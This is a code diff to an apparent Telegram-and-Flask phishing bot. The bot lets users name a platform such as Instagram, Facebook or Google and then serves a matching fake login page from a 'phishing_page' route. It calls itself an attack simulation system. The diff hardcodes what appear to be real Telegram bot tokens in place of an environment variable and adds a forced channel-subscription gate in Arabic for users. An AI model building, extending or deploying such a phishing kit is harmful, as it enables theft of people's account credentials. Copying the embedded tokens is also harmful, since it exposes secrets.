@@ -3,9 +3,11 @@ import flask
 import telebot
 import requests
 
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9024426042:AAFPUbF80JpK1FgYq0_ZEv9DdBtGkuuWF1I").strip()
+TELEGRAM_BOT_TOKEN = "9104150951:AAFLbGxsaiQAwci-p1w9BRnXOtoi8jzReO8"
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 app = flask.Flask(__name__)
+
+CHANNEL_USERNAME = "@bot1234569"
 
 target_data = {
     "platform": "Facebook",
@@ -19,8 +21,26 @@ def webhook():
     bot.process_new_updates([update])
     return "!", 200
 
+def check_subscription(user_id):
+    try:
+        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        if member.status in ['member', 'administrator', 'creator']:
+            return True
+    except Exception as e:
+        print(f"Error checking subscription: {e}")
+    return False
+
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
+    user_id = message.from_user.id
+    if not check_subscription(user_id):
+        markup = telebot.types.InlineKeyboardMarkup()
+        btn_channel = telebot.types.InlineKeyboardButton("📢 اشترك في القناة", url="https://t.me/bot1234569")
+        btn_check = telebot.types.InlineKeyboardButton("✅ لقد انضممت، تحقق", callback_data="check_sub")
+        markup.add(btn_channel, btn_check)
+        bot.reply_to(message, "🚨 **عذراً يا إسماعيل!** يجب عليك الاشتراك في قناتنا أولاً لتتمكن من استخدام البوت:\n\n🔗 https://t.me/bot1234569", reply_markup=markup, parse_mode="Markdown")
+        return
+
     target_data["chat_id"] = message.chat.id
     welcome_text = (
         "مرحباً بك يا إسماعيل في نظام محاكاة الهجمات. 🛡️\n\n"
@@ -28,8 +48,24 @@ def send_welcome(message):
     )
     bot.reply_to(message, welcome_text, parse_mode="Markdown")
 
+@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
+def callback_query(call):
+    user_id = call.from_user.id
+    if check_subscription(user_id):
+        bot.answer_callback_query(call.id, "✅ شكراً لاشتراكك!")
+        bot.send_message(call.id, "أهلاً بك يا إسماعيل! أرسل اسم المنصة الآن (مثل: Instagram, Facebook, Google).")
+    else:
+        bot.answer_callback_query(call.id, "❌ لم تقم بالانضمام للقناة بعد!", show_alert=True)
+
 @bot.message_handler(func=lambda message: not message.text.startswith('/'))
 def generate_payload(message):
+    user_id = message.from_user.id
+    if not check_subscription(user_id):
+        markup = telebot.types.InlineKeyboardMarkup()
+        markup.add(telebot.types.InlineKeyboardButton("📢 اشترك في القناة", url="https://t.me/bot1234569"))
+        bot.reply_to(message, "🚨 يجب عليك الاشتراك في القناة أولاً لتتمكن من استخدام البوت:\n\n🔗 https://t.me/bot1234569", reply_markup=markup)
+        return
+
     target_data["chat_id"] = message.chat.id
     platform_input = message.text.strip().capitalize()
     target_data["platform"] = platform_input
@@ -57,7 +93,6 @@ def generate_payload(message):
 def phishing_page():
     current_platform = target_data["platform"]
     
-    # تخصيص المظهر بناءً على المنصة المُختارة
     if "Instagram" in current_platform:
         title = "Instagram"
         color = "#E1306C"
